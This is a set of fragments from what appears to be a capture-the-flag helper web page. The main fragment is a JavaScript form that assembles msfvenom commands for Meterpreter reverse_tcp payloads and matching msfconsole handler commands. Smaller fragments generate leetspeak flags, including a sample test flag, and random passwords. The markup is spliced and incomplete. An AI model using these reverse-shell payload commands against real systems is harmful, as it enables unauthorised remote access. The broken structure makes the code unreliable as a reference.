    <input type="text" name="lhost" id="lhost" value="10.10.10.10" size="8" oninput="generate()">

        <option value="windows/x64/">windows</option>

    <select name="type" id="type" oninput="generate()">
        <option value="meterpreter">meterpreter</option>

    <p id="msfvenom"></p>
    <p id="msfconsole"></p>

    <script type="text/javascript">
        function generate() {
            let lhost = document.getElementById("lhost").value;
            let lport = document.getElementById("lport").value;
            let os = document.getElementById("os").value;
            let type = document.getElementById("type").value;
            let stage = document.getElementById("stage").value;

            let extension = "txt";
            if (os === "windows/x64/") {
                extension = "exe";
            } else if (os === "linux/x64/") {
                extension = "elf";
            }

            let msfvenom = "msfvenom -p " + os + type + stage + "reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f " + extension + " -o yz." + extension;
            let msfconsole = "msfconsole -q -x \"use multi/handler; set payload " + os + type + stage + "reverse_tcp; set lhost " + lhost + "; set lport " + lport + "; exploit\"";

            document.getElementById("msfvenom").innerHTML = msfvenom;
            document.getElementById("msfconsole").innerHTML = msfconsole;
        }
        generate();
    </script>

	<p id="result">flag{TH15_IS_0nly_A_tEst_flag!!}</p>
	<script type="text/javascript">
		function flaginate_char(char) {
			let substitutions = ["Aa4", "Bb", "Cc", "Dd", "Ee3", "Ff", "Gg", "Hh", "Ii1", "Jj", "Kk", "Ll", "Mm", "Nn", "Oo0", "Pp", "Qq", "Rr", "Ss5", "Tt", "Uu", "Vv", "Ww", "Xx", "Yy", "Zz2"];
			for (var i = 0; i < substitutions.length; i++) {
				if ( substitutions[i].indexOf(char) >= 0) {
					return substitutions[i][Math.floor(Math.random() * substitutions[i].length)];
				} 
			}
			if ( char === " " || char === "_" ) {
				return "_";
			}
			return char;
		}
		function flaginate() {
			let prefix = document.getElementById("prefix").value;
			let string = document.getElementById("string").value;
			let result = "";
			for (var i = 0; i < string.length; i++) {
				result += flaginate_char(string[i]);
			}
			document.getElementById("result").innerHTML = prefix + "{" + result + "}";
		}
		flaginate();
	</script>

        function makealphanum(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * charactersLength));
            }
            return result;
        }
        function getName(){
            let number = Math.floor(Math.random() * (names.length - 1));
            while(names[number] != names[number].toUpperCase()){
                number++;
            }
            let offset = number + 1;
            while(names[offset] != names[offset].toUpperCase()){
                offset++;
            }
            return names.substring(number, offset);
	    }
	    const name = getName() + " " + getName();

	    document.getElementById("password").innerHTML = makealphanum(32);
